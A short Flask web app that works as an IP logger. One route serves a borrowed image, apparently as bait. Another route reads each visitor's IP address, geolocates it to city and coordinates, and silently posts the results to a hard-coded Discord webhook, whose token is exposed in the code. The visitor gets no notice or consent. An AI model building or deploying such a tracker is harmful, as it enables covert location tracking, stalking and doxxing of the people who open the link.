from flask import Flask, request, send_file
import requests
import geoip2.database
import os

app = Flask(__name__)

@app.route('/')
def index():
    image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMLjbnRX_uOEdZ60l5z19uEwyazYghr46wEA&s"
    return send_file(requests.get(image_url, stream=True).raw, mimetype='image/jpeg')

@app.route('/log', methods=['GET'])
def log_ip():
    ip = request.remote_addr
    geo_db = geoip2.database.Reader('GeoLite2-City.mmdb')
    response = geo_db.city(ip)
    geo_info = {
        "ip": ip,
        "country": response.country.name,
        "city": response.city.name,
        "latitude": response.location.latitude,
        "longitude": response.location.longitude
    }
    webhook_url = "https://discordapp.com/api/webhooks/1363983953614340197/Zp_wS18KN2_mJMy4p0ecqXkRYI4C5hBEWF4ySz47RcY4rkF7Nye6pufbzHv0b1BI9Igp"
    payload = {
        "content": f"New visitor from IP: {geo_info['ip']}, {geo_info['city']}, {geo_info['country']} at coordinates {geo_info['latitude']}, {geo_info['longitude']}"
    }
    requests.post(webhook_url, json=payload)
    return "Logged!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)

